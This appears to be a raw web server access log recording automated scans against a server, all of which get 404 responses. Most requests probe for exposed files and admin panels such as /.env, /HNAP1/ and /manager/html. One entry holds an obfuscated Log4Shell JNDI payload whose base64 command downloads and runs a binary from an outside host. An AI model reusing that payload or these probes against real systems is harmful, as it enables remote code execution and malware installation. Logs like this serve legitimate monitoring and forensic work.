::ffff:127.0.0.1 - - [30/Aug/2022:20:59:06 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [30/Aug/2022:20:59:06 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:21:03:24 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [30/Aug/2022:21:03:24 +0000] "POST /HNAP1/ HTTP/1.0" 404 146 "-" "Mozila/5.0"
::ffff:127.0.0.1 - - [30/Aug/2022:21:14:43 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [30/Aug/2022:21:20:41 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [30/Aug/2022:21:42:23 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - afiiskc [30/Aug/2022:22:03:40 +0000] "GET /manager/html HTTP/1.0" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
::1 - - [30/Aug/2022:22:10:11 +0000] "GET /config/getuser?index=0 HTTP/1.0" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::ffff:127.0.0.1 - - [30/Aug/2022:22:15:18 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::1 - - [30/Aug/2022:22:20:13 +0000] "GET /actuator/gateway/routes HTTP/1.0" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:22:31:00 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [30/Aug/2022:22:31:02 +0000] "POST /HNAP1/ HTTP/1.0" 404 146 "-" "Mozila/5.0"
::ffff:127.0.0.1 - - [30/Aug/2022:22:38:37 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::1 - - [30/Aug/2022:22:46:53 +0000] "GET / HTTP/1.0" 404 139 "-" "Linux Gnu (cow)"
::ffff:127.0.0.1 - - [30/Aug/2022:22:48:32 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [30/Aug/2022:22:48:33 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:22:56:36 +0000] "GET / HTTP/1.0" 404 139 "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY2htb2QgNzc3IG9wZW52cG47IC4vb3BlbnZwbiBydW5uZXI=}')" "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3Jpb3Qvb3BlbnZwbjsgY2htb2QgNzc3IG9wZW52cG47IC4vb3BlbnZwbiBydW5uZXI=}')"
::1 - - [30/Aug/2022:23:05:21 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:23:05:22 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [30/Aug/2022:23:07:34 +0000] "GET /.env HTTP/1.0" 404 143 "-" "python-requests/2.28.1"
::ffff:127.0.0.1 - - [30/Aug/2022:23:07:35 +0000] "GET /?%3Cplay%3Ewithme%3C/%3E HTTP/1.0" 404 139 "-" "python-requests/2.28.1"
::1 - - [30/Aug/2022:23:07:36 +0000] "POST / HTTP/1.0" 404 140 "-" "python-requests/2.28.1"
::ffff:127.0.0.1 - - [30/Aug/2022:23:07:37 +0000] "POST / HTTP/1.0" 404 140 "-" "python-requests/2.28.1"
::1 - - [30/Aug/2022:23:40:35 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:23:40:36 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
